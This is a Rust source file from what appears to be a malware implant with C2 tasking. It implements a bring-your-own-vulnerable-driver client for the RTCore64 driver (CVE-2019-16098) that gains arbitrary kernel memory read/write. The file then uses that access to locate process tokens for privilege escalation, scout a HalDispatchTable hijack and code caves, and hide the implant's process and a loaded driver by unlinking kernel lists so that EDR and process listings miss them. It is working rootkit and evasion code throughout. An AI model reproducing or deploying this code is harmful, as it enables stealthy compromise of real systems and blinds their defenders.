//! Operator-supplied vulnerable-driver clients (ABR-T014, BYOVD stage
//! 3.2): the implant opens the driver's device after the operator staged
//! and loaded it through the ABR-T013 lifecycle, and speaks its protocol
//! to obtain kernel read/write primitives.
//!
//! Standing repo rule: **no vulnerable driver binaries in the
//! repository** — the client ships alone; the operator stages the
//! `.sys` (e.g. from LOLDrivers) over C2 upload tasking.
//!
//! The client surface is deliberately pluggable: every driver is one
//! self-contained type with `open` + `read`/`write`, and the DRIVER
//! `probe` action tries each known device in turn. Adding the next
//! shortlist driver (iqvw64e, WinIo-family) means adding one type, not
//! reworking the tasking.

use std::ffi::c_void;

use crate::evasion::syscalls;

type CreateFileWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    *mut c_void,
    u32,
    u32,
    *mut c_void,
) -> *mut c_void;
type DeviceIoControlFn = unsafe extern "system" fn(
    *mut c_void,
    u32,
    *mut c_void,
    u32,
    *mut c_void,
    u32,
    *mut u32,
    *mut c_void,
) -> i32;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

/// Shared Win32 surface every client needs. Resolved through the manual
/// export walk like the rest of the implant — no import-table additions.
struct Win32 {
    create_file_w: CreateFileWFn,
    device_io_control: DeviceIoControlFn,
    close_handle: CloseHandleFn,
}

impl Win32 {
    unsafe fn resolve() -> Result<Self, String> {
        Ok(Win32 {
            create_file_w: std::mem::transmute::<usize, CreateFileWFn>(
                syscalls::export_address("kernel32.dll", "CreateFileW")
                    .ok_or("CreateFileW unresolved")?,
            ),
            device_io_control: std::mem::transmute::<usize, DeviceIoControlFn>(
                syscalls::export_address("kernel32.dll", "DeviceIoControl")
                    .ok_or("DeviceIoControl unresolved")?,
            ),
            close_handle: std::mem::transmute::<usize, CloseHandleFn>(
                syscalls::export_address("kernel32.dll", "CloseHandle")
                    .ok_or("CloseHandle unresolved")?,
            ),
        })
    }
}

/// RTCore64 (MSI Afterburner / MSI Center, CVE-2019-16098 family).
/// Device `\\.\RTCore64`; a single 48-byte METHOD_BUFFERED struct serves
/// as both input and output for arbitrary **kernel virtual** read/write
/// with 1/2/4-byte widths (64-bit values compose two 32-bit transfers).
/// Protocol pinned against the original CVE-2019-16098 PoC, the
/// idafchev decompilation and the CVE-2022-22077 framework — three
/// independent sources agree on the layout below.
pub struct RtCore64 {
    device: *mut c_void,
    win32: Win32,
}

const GENERIC_READ: u32 = 0x8000_0000;
const GENERIC_WRITE: u32 = 0x4000_0000;
const OPEN_EXISTING: u32 = 3;

const RTCORE_IOCTL_READ: u32 = 0x8000_2048;
const RTCORE_IOCTL_READ_PHYS: u32 = 0x8000_2040;
#[allow(dead_code)]
const RTCORE_IOCTL_WRITE: u32 = 0x8000_204C;

/// Exactly 48 bytes — the driver rejects any other buffer length.
#[repr(C)]
struct RtCoreMemory {
    pad0: [u8; 8],
    address: u64,
    pad1: [u8; 8],
    size: u32,
    value: u32,
    pad3: [u8; 16],
}

impl RtCore64 {
    pub fn open() -> Result<Self, String> {
        let win32 = unsafe { Win32::resolve()? };
        let path: Vec<u16> = r"\\.\RTCore64"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();
        let device = unsafe {
            (win32.create_file_w)(
                path.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null_mut(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut(),
            )
        };
        // INVALID_HANDLE_VALUE (-1), not null, is the failure sentinel.
        if device as usize == usize::MAX || device.is_null() {
            return Err("RTCore64 device not available (\\\\.\\RTCore64)".into());
        }
        Ok(RtCore64 { device, win32 })
    }

    fn transfer(&self, code: u32, address: u64, size: u32, value: u32) -> Result<u32, String> {
        if !matches!(size, 1 | 2 | 4) {
            return Err("RTCore64 width must be 1, 2 or 4 bytes".into());
        }
        let mut request = RtCoreMemory {
            pad0: [0; 8],
            address,
            pad1: [0; 8],
            size,
            value,
            pad3: [0; 16],
        };
        let mut returned = 0u32;
        let len = std::mem::size_of::<RtCoreMemory>() as u32;
        let ok = unsafe {
            (self.win32.device_io_control)(
                self.device,
                code,
                &mut request as *mut _ as *mut c_void,
                len,
                &mut request as *mut _ as *mut c_void,
                len,
                &mut returned,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            return Err(format!("DeviceIoControl({code:#x}) failed"));
        }
        Ok(request.value)
    }

    pub fn read(&self, address: u64, width: u32) -> Result<u32, String> {
        self.transfer(RTCORE_IOCTL_READ, address, width, 0)
    }

    /// Write primitives land with the kernel mapper (stage 3.3); the
    /// probe deliberately never writes.
    #[allow(dead_code)]
    pub fn write(&self, address: u64, width: u32, value: u32) -> Result<(), String> {
        self.transfer(RTCORE_IOCTL_WRITE, address, width, value)
            .map(|_| ())
    }

    /// Two 32-bit transfers — the driver caps a single transfer at 4 bytes.
    #[allow(dead_code)]
    pub fn read64(&self, address: u64) -> Result<u64, String> {
        let lo = self.read(address, 4)? as u64;
        let hi = self.read(address + 4, 4)? as u64;
        Ok(lo | (hi << 32))
    }

    #[allow(dead_code)]
    pub fn write64(&self, address: u64, value: u64) -> Result<(), String> {
        self.write(address, 4, value as u32)?;
        self.write(address + 4, 4, (value >> 32) as u32)
    }
}

impl Drop for RtCore64 {
    fn drop(&mut self) {
        if !self.device.is_null() {
            unsafe { (self.win32.close_handle)(self.device) };
        }
    }
}

/// ntoskrnl base through spoofed `NtQuerySystemInformation(
/// SystemModuleInformation)` — the classic leak, dispatched over the
/// indirect-syscall layer (ABR-T005/T010) like every other NT call the
/// implant makes. The first entry of the module list is ntoskrnl.
pub(crate) fn ntoskrnl_base() -> Result<u64, String> {
    let modules = kernel_modules()?;
    let base = modules.first().map(|m| m.1).unwrap_or(0);
    if base == 0 {
        return Err("ntoskrnl ImageBase null".into());
    }
    Ok(base)
}

/// One loaded kernel module: (lowercased path, base, size). Parsed from
/// RTL_PROCESS_MODULES — the entry layout is stable across the builds
/// we care about (ImageBase at +0x10, ImageSize at +0x18, NameOffset at
/// +0x24, path at +0x28, entry stride 0x128).
pub(crate) fn kernel_modules() -> Result<Vec<(String, u64, u32)>, String> {
    const SYSTEM_MODULE_INFORMATION: usize = 11;
    let query = unsafe { syscalls::resolve("NtQuerySystemInformation") }
        .ok_or("NtQuerySystemInformation unresolved")?;
    const STATUS_INFO_LENGTH_MISMATCH: u32 = 0xC000_0004;
    let mut buffer = vec![0u8; 0x1000];
    loop {
        let mut needed = 0usize;
        let status = unsafe {
            syscalls::dispatch6(
                query,
                SYSTEM_MODULE_INFORMATION,
                buffer.as_mut_ptr() as usize,
                buffer.len(),
                &mut needed as *mut usize as usize,
                0,
                0,
            )
        };
        let nt = status as u32 as i32;
        if nt >= 0 {
            break;
        }
        if nt as u32 != STATUS_INFO_LENGTH_MISMATCH {
            return Err(format!(
                "NtQuerySystemInformation(SystemModuleInformation) failed: {:#010x}",
                nt as u32
            ));
        }
        let grow = if needed > buffer.len() {
            needed
        } else {
            buffer.len().saturating_mul(2)
        };
        if grow > 0x80_0000 {
            return Err("module query size runaway".into());
        }
        buffer.resize(grow, 0);
    }
    let count = u32::from_le_bytes(buffer[0..4].try_into().unwrap()) as usize;
    let mut out = Vec::with_capacity(count.min(1024));
    for index in 0..count {
        let entry = 8 + index * 0x128;
        if entry + 0x28 + 64 > buffer.len() {
            break;
        }
        let base = u64::from_le_bytes(buffer[entry + 0x10..entry + 0x18].try_into().unwrap());
        let size = u32::from_le_bytes(buffer[entry + 0x18..entry + 0x1C].try_into().unwrap());
        // OffsetToFileName sits at +0x26 (after LoadCount at +0x24) —
        // reading +0x24 returned LoadCount and mangled every basename
        // (live regression found by the ABR-T018 import resolver).
        let name_off =
            u16::from_le_bytes(buffer[entry + 0x26..entry + 0x28].try_into().unwrap()) as usize;
        let path_start = entry + 0x28 + name_off;
        let path_end = buffer[path_start..]
            .iter()
            .position(|b| *b == 0)
            .map(|n| path_start + n)
            .unwrap_or(buffer.len());
        let path = String::from_utf8_lossy(&buffer[path_start..path_end]).to_lowercase();
        out.push((path, base, size));
    }
    Ok(out)
}

/// Finds a loaded kernel module by case-insensitive substring.
fn find_kernel_module(needle: &str) -> Result<(u64, u32), String> {
    kernel_modules()?
        .into_iter()
        .find(|(path, _, _)| path.contains(&needle.to_lowercase()))
        .map(|(_, base, size)| (base, size))
        .ok_or_else(|| format!("kernel module '{needle}' not loaded"))
}

/// Section virtual-address and virtual-size by 6-byte name prefix
/// (e.g. `.text`), headers read through the kernel primitive.
fn kernel_section<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    base: u64,
    want: &[u8; 6],
) -> Result<(u64, u64), String> {
    let mut headers = [0u8; 0x400];
    read_buf_via(base, &mut headers, &read64)?;
    let lfanew = u32::from_le_bytes(headers[0x3C..0x40].try_into().unwrap()) as usize;
    let num_sections =
        u16::from_le_bytes(headers[lfanew + 6..lfanew + 8].try_into().unwrap()) as usize;
    let optional_size =
        u16::from_le_bytes(headers[lfanew + 0x14..lfanew + 0x16].try_into().unwrap()) as usize;
    let sections = lfanew + 0x18 + optional_size;
    if sections + num_sections * 40 > headers.len() {
        return Err("section table beyond header buffer".into());
    }
    for index in 0..num_sections {
        let at = sections + index * 40;
        if &headers[at..at + 6] == want {
            let vsize = u32::from_le_bytes(headers[at + 8..at + 12].try_into().unwrap()) as u64;
            let va = u32::from_le_bytes(headers[at + 12..at + 16].try_into().unwrap()) as u64;
            return Ok((va, vsize));
        }
    }
    Err(format!(
        "section {} not found",
        String::from_utf8_lossy(want)
    ))
}

/// Finds the first section whose characteristics carry both WRITE and
/// EXECUTE — on this driver the discardable INIT section (RWX while
/// mapped), the only image-backed home where a stub can be written
/// without a PTE flip (RX stores bugcheck 0xBE; lab report Part 6).
fn find_rwx_section<R: Fn(u64) -> Result<u64, String>>(
    read64: R,
    base: u64,
) -> Result<(u64, u64), String> {
    let mut headers = [0u8; 0x400];
    read_buf_via(base, &mut headers, &read64)?;
    let lfanew = u32::from_le_bytes(headers[0x3C..0x40].try_into().unwrap()) as usize;
    let num_sections =
        u16::from_le_bytes(headers[lfanew + 6..lfanew + 8].try_into().unwrap()) as usize;
    let optional_size =
        u16::from_le_bytes(headers[lfanew + 0x14..lfanew + 0x16].try_into().unwrap()) as usize;
    let sections = lfanew + 0x18 + optional_size;
    if sections + num_sections * 40 > headers.len() {
        return Err("section table beyond header buffer".into());
    }
    const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
    const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
    for index in 0..num_sections {
        let at = sections + index * 40;
        let chars = u32::from_le_bytes(headers[at + 36..at + 40].try_into().unwrap());
        if chars & (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
            == (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
        {
            let vsize = u32::from_le_bytes(headers[at + 8..at + 12].try_into().unwrap()) as u64;
            let va = u32::from_le_bytes(headers[at + 12..at + 16].try_into().unwrap()) as u64;
            return Ok((va, vsize));
        }
    }
    Err("no RWX section in module".into())
}

/// Finds `need` guaranteed-zero bytes in a section's tail padding (the
/// slack between VirtualSize end and the section-alignment boundary) —
/// an image-backed, executable (for .text) code cave that nothing owns.
fn find_section_cave(
    read64: &impl Fn(u64) -> Result<u64, String>,
    base: u64,
    section_va: u64,
    section_size: u64,
    need: usize,
) -> Result<u64, String> {
    let start = (base + section_va + section_size + 7) & !7;
    let end = base + section_va + ((section_size + 0xFFF) & !0xFFF) - 16;
    if end <= start || (end - start) as usize > 0x2000 {
        return Err("section has no padded tail to scan".into());
    }
    let mut window = vec![0u8; 0x100];
    let mut address = start;
    while address + 0x100 <= end {
        read_buf_via(address, &mut window, read64)?;
        let mut run = 0usize;
        for (offset, byte) in window.iter().enumerate() {
            run = if *byte == 0 { run + 1 } else { 0 };
            if run >= need {
                return Ok(address + offset as u64 + 1 - need as u64);
            }
        }
        address += (0x100 - run.min(0xFF)) as u64;
    }
    Err("no zero cave found in section padding".into())
}

/// DRIVER `probe` action: open every known vulnerable-driver device and,
/// on the first that answers, prove arbitrary kernel read by leaking the
/// ntoskrnl base and reading its DOS header through the driver.
pub fn probe_depth(depth_spec: &str) -> Result<Vec<u8>, String> {
    // Staged read-only dry-run of the elevate path: a single bad address
    // handed to the driver bugchecks the whole box, so each stage gets
    // isolated crash-or-report evidence.
    //   1 - ntoskrnl base + MZ + PsInitialSystemProcess export resolve
    //   2 - + the PsInitialSystemProcess pointer and System PID check
    //   3 - + the ActiveProcessLinks walk to self and both token slots
    let depth: u8 = depth_spec.trim().parse().unwrap_or(3);
    let rtcore = match RtCore64::open() {
        Ok(handle) => handle,
        Err(e) => {
            return Ok(format!("no vulnerable-driver device answered ({e})").into_bytes());
        }
    };
    let base = ntoskrnl_base()?;
    let magic = rtcore
        .read(base, 2)
        .map_err(|e| format!("kernel read failed: {e}"))?;
    let mut report = format!(
        "rtcore64 d{depth}: device open; ntoskrnl @ {base:#x}; kernel read ok: {magic:#06x}"
    );
    if magic == 0x5A4D {
        report.push_str(" (MZ verified)");
    }
    if depth < 1 {
        return Ok(report.into_bytes());
    }
    let psis_rva = kernel_export_rva(|a| rtcore.read64(a), base, "PsInitialSystemProcess")?;
    report.push_str(&format!("; PsIS rva {psis_rva:#x}"));
    if depth < 2 {
        return Ok(report.into_bytes());
    }
    let system_eproc = rtcore.read64(base + psis_rva as u64)?;
    let system_pid = rtcore.read64(system_eproc + EPROC_PID)?;
    report.push_str(&format!(
        "; system eproc {system_eproc:#x}, pid field reads {system_pid}"
    ));
    if depth < 3 {
        return Ok(report.into_bytes());
    }
    let my_pid = std::process::id();
    let links_off = discover_links_offset(|a| rtcore.read64(a), system_eproc, my_pid)?;
    let own_eproc = try_walk(|a| rtcore.read64(a), system_eproc, links_off, my_pid)?;
    let token_off = discover_token_offset(|a| rtcore.read64(a), system_eproc, own_eproc)?;
    let system_token = rtcore.read64(system_eproc + token_off)?;
    let own_token = rtcore.read64(own_eproc + token_off)?;
    report.push_str(&format!(
        "; links +{links_off:#x}, token +{token_off:#x}; own eproc {own_eproc:#x}; tokens system {system_token:#x} own {own_token:#x}"
    ));
    if depth < 4 {
        return Ok(report.into_bytes());
    }
    // depth 4: exec-vector prep, all read-only — HalDispatchTable export,
    // the hijack slot's current value, and zero caves in the vulnerable
    // driver's .text (shellcode home) and .data (scratch flag).
    let (drv_base, drv_size) = find_kernel_module("rtcore64")?;
    let hal_rva = kernel_export_rva(|a| rtcore.read64(a), base, "HalDispatchTable")?;
    let slot = base + hal_rva as u64 + 8;
    let slot_value = rtcore.read64(slot)?;
    let (text_va, text_size) = kernel_section(|a| rtcore.read64(a), drv_base, b".text ")?;
    let (data_va, data_size) = kernel_section(|a| rtcore.read64(a), drv_base, b".data ")?;
    let cave = find_section_cave(&|a| rtcore.read64(a), drv_base, text_va, text_size, 0x40)?;
    let scratch = find_section_cave(&|a| rtcore.read64(a), drv_base, data_va, data_size, 0x10)?;
    report.push_str(&format!(
        "; drv {drv_base:#x}+{drv_size:#x}, hal slot {slot:#x}={slot_value:#x}, cave +{:#x}, scratch +{:#x}",
        cave - drv_base,
        scratch - drv_base
    ));
    if depth < 5 {
        return Ok(report.into_bytes());
    }
    // depth 5: write-capability proof on WRITABLE memory only — one
    // flag into the driver's .data padding, read back, zeroed again.
    // (The first design also stamped a pattern into the .text cave and
    // bugchecked 0xBE: the write primitive honors PTE protection, so RX
    // image pages are off limits without a PTE flip.)
    let flag: u64 = 0x1BADB002;
    rtcore.write64(scratch, flag)?;
    let flag_back = rtcore.read64(scratch)?;
    rtcore.write64(scratch, 0)?;
    report = format!(
        "rtcore64 d{depth}: .data write {flag_back:#x} ({})",
        if flag_back == flag { "ok" } else { "MISMATCH" }
    );
    if depth < 6 {
        return Ok(report.into_bytes());
    }
    // depth 6: physical-memory probe — the Afterburner RTCore64 exposes
    // read/write PHYSICAL at 0x80002040/44; if this variant does too,
    // page-table games (PTE flips) become possible. Read-only test at a
    // safe low physical address.
    let mut phys = RtCoreMemory {
        pad0: [0; 8],
        address: 0xFFFF_FFF0,
        pad1: [0; 8],
        size: 4,
        value: 0,
        pad3: [0; 16],
    };
    let mut returned = 0u32;
    let phys_rc = unsafe {
        (rtcore.win32.device_io_control)(
            rtcore.device,
            RTCORE_IOCTL_READ_PHYS,
            &mut phys as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<RtCoreMemory>() as u32,
            &mut phys as *mut _ as *mut std::ffi::c_void,
            std::mem::size_of::<RtCoreMemory>() as u32,
            &mut returned,
            std::ptr::null_mut(),
        )
    };
    report.push_str(&format!(
        "; phys read rc={phys_rc} value={:#x} (reset vector is never zero - no real physical path)",
        phys.value
    ));
    if depth < 7 {
        return Ok(report.into_bytes());
    }
    // depth 7: hunt for an existing RWX section across loaded kernel
    // modules - a writable+executable section gives the exec stub a home
    // without any PTE flip (image pages stay untouched).
    let mut found = String::new();
    for (path, mbase, _msize) in kernel_modules()?.into_iter().take(400) {
        let mut headers = [0u8; 0x400];
        if read_buf_via(mbase, &mut headers, |a| rtcore.read64(a)).is_err() {
            continue;
        }
        let lfanew = u32::from_le_bytes(headers[0x3C..0x40].try_into().unwrap()) as usize;
        if headers[lfanew..lfanew + 4] != *b"PE  " {
            continue;
        }
        let num_sections =
            u16::from_le_bytes(headers[lfanew + 6..lfanew + 8].try_into().unwrap()) as usize;
        let optional_size =
            u16::from_le_bytes(headers[lfanew + 0x14..lfanew + 0x16].try_into().unwrap()) as usize;
        let sections = lfanew + 0x18 + optional_size;
        if sections + num_sections * 40 > headers.len() {
            continue;
        }
        for index in 0..num_sections {
            let at = sections + index * 40;
            let chars = u32::from_le_bytes(headers[at + 36..at + 40].try_into().unwrap());
            const IMAGE_SCN_MEM_WRITE: u32 = 0x8000_0000;
            const IMAGE_SCN_MEM_EXECUTE: u32 = 0x2000_0000;
            if chars & (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
                == (IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE)
            {
                let vsize = u32::from_le_bytes(headers[at + 8..at + 12].try_into().unwrap()) as u64;
                let va = u32::from_le_bytes(headers[at + 12..at + 16].try_into().unwrap()) as u64;
                let name = String::from_utf8_lossy(&headers[at..at + 8])
                    .trim_end_matches(' ')
                    .to_string();
                found.push_str(&format!(
                    "{}+{}({name},+{vsize:#x}) ",
                    path.rsplit('\\').next().unwrap_or(&path),
                    va
                ));
                if found.len() > 200 {
                    break;
                }
            }
        }
        if found.len() > 200 {
            break;
        }
    }
    if found.is_empty() {
        report.push_str("; rwx scan: none");
    } else {
        report.push_str(&format!("; rwx: {found}"));
    }
    Ok(report.into_bytes())
}

/// Saved DKOM state: one (own links field, previous, next) triple per
/// unlinked process list. The unlink is only reversible while the
/// neighbors still point at each other, which `unhide` re-validates
/// before relinking.
#[derive(Default)]
struct DkomState {
    lists: Option<Vec<(u64, u64, u64)>>,
}

static DKOM: std::sync::OnceLock<std::sync::Mutex<DkomState>> = std::sync::OnceLock::new();

fn dkom_store() -> &'static std::sync::Mutex<DkomState> {
    DKOM.get_or_init(|| std::sync::Mutex::new(DkomState::default()))
}

/// DRIVER `hide` action (stage 3.4, ABR-T016): classic DKOM — unlink the
/// implant's EPROCESS from ActiveProcessLinks. Pure data-plane, every
/// address validated; NtQuerySystemInformation-based tooling (tasklist,
/// Get-Process, most EDR process listings) stops seeing the process
/// while the session keeps answering.
pub fn hide() -> Result<Vec<u8>, String> {
    let rtcore =
        RwClient::open_preferred().map_err(|e| format!("no vulnerable-driver device: {e}"))?;
    let base = ntoskrnl_base()?;
    let psis_rva = kernel_export_rva(|a| rtcore.read64(a), base, "PsInitialSystemProcess")?;
    let system_eproc = rtcore.read64(base + psis_rva as u64)?;
    let my_pid = std::process::id();
    let mut lists = discover_list_offsets_retrying(|a| rtcore.read64(a), system_eproc, my_pid)?;
    let own = try_walk(|a| rtcore.read64(a), system_eproc, lists[0], my_pid)?;

    // The enumeration list IS the psi source, so its length matches the
    // psi count exactly; every other candidate (session/job/audited
    // lists) differs. Unlinking an audited list bugchecks 0x139 arg3
    // within ~100s (live 2026-09-12, EID 1001 01:10:57) - so candidates
    // are tried ONE at a time, closest-length first, with the psi
    // oracle deciding within ~1s whether the unlink actually hid us;
    // a miss is relinked immediately.
    let expected = live_process_count()? as i64;
    lists.sort_by_key(|off| {
        let len = list_length(|a| rtcore.read64(a), system_eproc, *off).unwrap_or(0) as i64;
        (len - expected).abs()
    });

    let unlink_one = |links_off: u64| -> Result<Option<(u64, u64, u64)>, String> {
        let own_links = own + links_off;
        let flink = rtcore.read64(own_links)?;
        let blink = rtcore.read64(own_links + 8)?;
        if !plausible_link(flink, links_off) || !plausible_link(blink, links_off) {
            return Err(format!(
                "neighbors implausible at +{links_off:#x} (F {flink:#x}, B {blink:#x})"
            ));
        }
        rtcore
            .write64_verified(blink, flink)
            .and_then(|()| rtcore.write64_verified(flink + 8, blink))
            .map_err(|e| format!("unlink write failed at +{links_off:#x}: {e}"))?;
        if rtcore.read64(blink)? != flink || rtcore.read64(flink + 8)? != blink {
            return Err(format!("unlink verification failed at +{links_off:#x}"));
        }
        Ok(Some((own_links, flink, blink)))
    };
    let relink = |own_links: u64, flink: u64, blink: u64| {
        rtcore.write64(blink, own_links).ok();
        rtcore.write64(flink + 8, own_links).ok();
    };

    for links_off in &lists {
        let Some((own_links, flink, blink)) = unlink_one(*links_off)? else {
            continue;
        };
        if !psi_contains_pid(my_pid).unwrap_or(true)
            && try_walk(|a| rtcore.read64(a), system_eproc, *links_off, my_pid).is_err()
        {
            dkom_store().lock().unwrap().lists = Some(vec![(own_links, flink, blink)]);
            let client = rtcore.name();
            return Ok(format!(
                "hide: eproc {own:#x} unlinked from +{links_off:#x} over {client} (psi oracle: pid {my_pid} gone from SystemProcessInformation) - process listings no longer show it"
            )
            .into_bytes());
        }
        // Wrong list: restore before the audited-list fuse (~100s) can
        // trip and try the next candidate.
        relink(own_links, flink, blink);
    }
    // Diagnostics: why did no candidate work? For every shape-plausible
    // offset report walk/length status against the psi count.
    let mut diag = String::new();
    for x in (0x1D8..0xA00).step_by(8) {
        let flink = rtcore.read64(system_eproc + x).unwrap_or(0);
        let blink = rtcore.read64(system_eproc + x + 8).unwrap_or(0);
        if !plausible_link(flink, x) || !plausible_link(blink, x) {
            continue;
        }
        let walk = try_walk(|a| rtcore.read64(a), system_eproc, x, my_pid);
        let len = list_length(|a| rtcore.read64(a), system_eproc, x).unwrap_or(0);
        diag.push_str(&format!(
            "+{x:x}{}{len} ",
            if walk.is_ok() { "w" } else { "e" }
        ));
    }
    let n = lists.len();
    Err(format!(
        "no candidate unlink hid pid {my_pid} from psi ({n} tried) - restored; psi {expected}; {diag}"
    ))
}

/// DRIVER `unhide` action: relink the saved list entry, but only while
/// the neighbors still point at each other (if either exited meanwhile,
/// the saved pointers reference freed pool and relinking would corrupt
/// it).
pub fn unhide() -> Result<Vec<u8>, String> {
    let rtcore =
        RwClient::open_preferred().map_err(|e| format!("no vulnerable-driver device: {e}"))?;
    let saved = dkom_store()
        .lock()
        .unwrap()
        .lists
        .take()
        .ok_or("not hidden (no saved state)")?;
    // Validate EVERY list before touching ANY of them.
    for (_own_links, flink, blink) in &saved {
        if rtcore.read64(*blink)? != *flink || rtcore.read64(*flink + 8)? != *blink {
            // put the state back - the caller may retry later
            dkom_store().lock().unwrap().lists = Some(saved);
            return Err(
                "neighbors moved on - refusing stale relink; staying hidden until reboot".into(),
            );
        }
    }
    let saved_for_retry = saved.clone();
    for (index, (own_links, flink, blink)) in saved.iter().enumerate() {
        // Mid-loop write failure: roll the prefix back to hidden and
        // hand the saved state back so a retry can finish (a bare `?`
        // abandoned a half-relinked list - audit finding).
        if let Err(e) = rtcore
            .write64_verified(*blink, *own_links)
            .and_then(|()| rtcore.write64_verified(*flink + 8, *own_links))
        {
            for (_ow, f, b) in &saved[..=index] {
                rtcore.write64(*b, *f).ok();
                rtcore.write64(*f + 8, *b).ok();
            }
            dkom_store().lock().unwrap().lists = Some(saved_for_retry);
            return Err(format!(
                "relink write failed at +{:#x} ({e}) - re-hidden, retry available",
                own_links & 0xFFF
            ));
        }
        if rtcore.read64(*own_links)? != *flink || rtcore.read64(*own_links + 8)? != *blink {
            return Err("relink verification failed - list may be inconsistent".into());
        }
    }
    Ok(format!("unhide: relinked {} list entries", saved.len()).into_bytes())
}

/// Saved module-unlink state: (InLoadOrderLinks address, Flink, Blink).
#[derive(Default)]
struct ModHideState {
    entry: Option<(u64, u64, u64)>,
}

static MODHIDE: std::sync::OnceLock<std::sync::Mutex<ModHideState>> = std::sync::OnceLock::new();

fn modhide_store() -> &'static std::sync::Mutex<ModHideState> {
    MODHIDE.get_or_init(|| std::sync::Mutex::new(ModHideState::default()))
}

/// One byte read through the 64-bit primitive (the extra bytes in the
/// qword are simply ignored).
fn read8(rw: &RwClient, address: u64) -> Result<u8, String> {
    Ok(rw.read64(address)? as u8)
}

/// Byte write with qword read-modify-write: the Protection offset is
/// not necessarily 8-aligned, so patching byte 0 of the unaligned
/// qword preserves every neighboring field.
fn write8_verified(rw: &RwClient, address: u64, value: u8) -> Result<(), String> {
    let qword = rw.read64(address)?;
    let patched = (qword & !0xFF) | value as u64;
    rw.write64_verified(address, patched)
}

fn module_list_length(rw: &RwClient, head: u64) -> Result<usize, String> {
    let mut entry = rw.read64(head)?;
    let mut hops = 0usize;
    while entry != head {
        if !plausible_link(entry, 0) {
            return Err(format!(
                "module walk hop {hops}: implausible link {entry:#x}"
            ));
        }
        entry = rw.read64(entry)?;
        hops += 1;
        if hops > 1024 {
            return Err("module walk runaway".into());
        }
    }
    Ok(hops)
}

/// Pure name matcher for the UTF-16LE BaseDllName buffer.
fn module_name_matches(name_bytes: &[u8], target: &str) -> bool {
    let mut name = String::new();
    for pair in name_bytes.chunks(2) {
        if pair.len() < 2 || (pair[0] == 0 && pair[1] == 0) {
            break;
        }
        name.push(pair[0] as char);
    }
    name.eq_ignore_ascii_case(target)
}

/// Pure matcher for ANSI char[15] fields (EPROCESS.ImageFileName).
#[cfg(test)]
fn ansi_name_matches(name_bytes: &[u8], target: &str) -> bool {
    let end = name_bytes
        .iter()
        .position(|b| *b == 0)
        .unwrap_or(name_bytes.len());
    name_bytes[..end].eq_ignore_ascii_case(target.as_bytes())
}

/// DRIVER `modhide <name>` action (ABR-T019).
pub fn modhide(name: &str) -> Result<Vec<u8>, String> {
    let target = name.trim().to_lowercase();
    if target.is_empty() {
        return Err("modhide requires a module name (e.g. iqvw64e.sys)".into());
    }
    if modhide_store().lock().unwrap().entry.is_some() {
        return Err("a module is already hidden - modshow first".into());
    }
    let rw = RwClient::open_preferred()?;
    let base = ntoskrnl_base()?;
    let head = base + kernel_export_rva(|a| rw.read64(a), base, "PsLoadedModuleList")? as u64;
    let before = module_list_length(&rw, head)?;

    // Walk InLoadOrderLinks (offset 0 of the entry); BaseDllName is a
    // UNICODE_STRING at +0x58 (u16 len, u16 max, u32 pad, u64 buffer at
    // +0x60).
    let mut entry = rw.read64(head)?;
    let mut found = 0u64;
    let mut hops = 0usize;
    while entry != head && hops < 1024 {
        if !plausible_link(entry, 0) {
            return Err(format!("module hop {hops}: implausible link {entry:#x}"));
        }
        let len = rw.read64(entry + 0x58)? as u16;
        let buffer = rw.read64(entry + 0x60)?;
        if len > 0
            && len <= 128
            && (0xFFFF_8000_0000_0000..=0xFFFF_FFFF_FFFF_FFFF).contains(&buffer)
        {
            let mut name_bytes = vec![0u8; len as usize];
            read_buf_via(buffer, &mut name_bytes, |a| rw.read64(a))?;
            if module_name_matches(&name_bytes, &target) {
                found = entry;
                break;
            }
        }
        entry = rw.read64(entry)?;
        hops += 1;
    }
    if found == 0 {
        return Err(format!("module {target} not on PsLoadedModuleList"));
    }

    let flink = rw.read64(found)?;
    let blink = rw.read64(found + 8)?;
    if !plausible_link(flink, 0) || !plausible_link(blink, 0) {
        return Err(format!(
            "module neighbors implausible (F {flink:#x}, B {blink:#x})"
        ));
    }
    rw.write64_verified(blink, flink)
        .and_then(|()| rw.write64_verified(flink + 8, blink))
        .map_err(|e| format!("unlink write failed ({e}) - list untouched"))?;
    if rw.read64(blink)? != flink || rw.read64(flink + 8)? != blink {
        return Err("unlink verification failed - refusing to continue".into());
    }
    modhide_store().lock().unwrap().entry = Some((found, flink, blink));

    let after = module_list_length(&rw, head)?;
    // Cross-view proof: our own NtQuerySystemInformation module list.
    let seen_own = kernel_modules()?
        .iter()
        .any(|(path, _, _)| path.to_lowercase().contains(&target));
    let client = rw.name();
    Ok(format!(
        "modhide: {target} entry {found:#x} unlinked from PsLoadedModuleList ({before}->{after} modules; own module query still sees it: {seen_own}) over {client} - driver enumeration blind, device live"
    )
    .into_bytes())
}

/// DRIVER `modshow <name>` action: relink the saved module entry, only
/// while the neighbors still point at each other.
pub fn modshow(name: &str) -> Result<Vec<u8>, String> {
    let target = name.trim().to_lowercase();
    let saved = modhide_store()
        .lock()
        .unwrap()
        .entry
        .take()
        .ok_or("no hidden module (no saved state)")?;
    let (found, flink, blink) = saved;
    let rw = RwClient::open_preferred()?;
    if rw.read64(blink)? != flink || rw.read64(flink + 8)? != blink {
        // put the state back - a retry may still be possible
        modhide_store().lock().unwrap().entry = Some(saved);
        return Err("module neighbors moved on - refusing stale relink".into());
    }
    rw.write64_verified(blink, found)
        .and_then(|()| rw.write64_verified(flink + 8, found))
        .map_err(|e| format!("relink write failed ({e}) - still hidden"))?;
    let base = ntoskrnl_base()?;
    let head = base + kernel_export_rva(|a| rw.read64(a), base, "PsLoadedModuleList")? as u64;
    let after = module_list_length(&rw, head)?;
    Ok(format!("modshow: {target} relinked ({after} modules visible again)").into_bytes())
}

